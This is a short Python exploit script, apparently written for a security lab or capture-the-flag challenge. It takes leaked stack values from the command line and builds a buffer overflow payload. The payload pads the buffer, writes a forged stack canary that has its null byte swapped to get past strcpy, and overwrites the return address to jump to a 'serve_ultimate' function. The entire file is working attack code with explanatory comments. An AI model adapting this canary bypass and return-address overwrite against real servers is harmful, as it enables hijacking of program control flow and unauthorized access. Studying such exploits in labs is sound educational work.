import requests, sys, os
from requests import Request, Session,exceptions


split = sys.argv[1]     #get input

last40 = split[-40:]    #we keep only the 40 last characters

# we calculate the corect return addres. The return address is the address where route calls serve ultimate
returnaddress = str(hex(int(last40[32:40],16) + 325))       

# address of canary. we use this address so the for loop in post_param replaces the \x26 we put in the canary with \x00
temp =  int(last40[24:32],16) - 172
canaryaddress = str(hex(temp))      

#we replace the \x00 in the canary with \x26 so that stcpy doesnt stop
canary = str(hex(int(last40[0:8],16) + 38))     

data = bytes.fromhex(canaryaddress[2:])[::-1]
for i in range(0,14):
    data += bytes.fromhex(canaryaddress[2:])[::-1]  #we fill the buffer with the canary address, just to be sure, up untill we reach the canary

data += bytes.fromhex(canary[2:])[::-1]     #canary
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1] # 3 random values, doesn't really matter
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(returnaddress[2:])[::-1]          #return addres of serve_ultimate call in route

print(data)

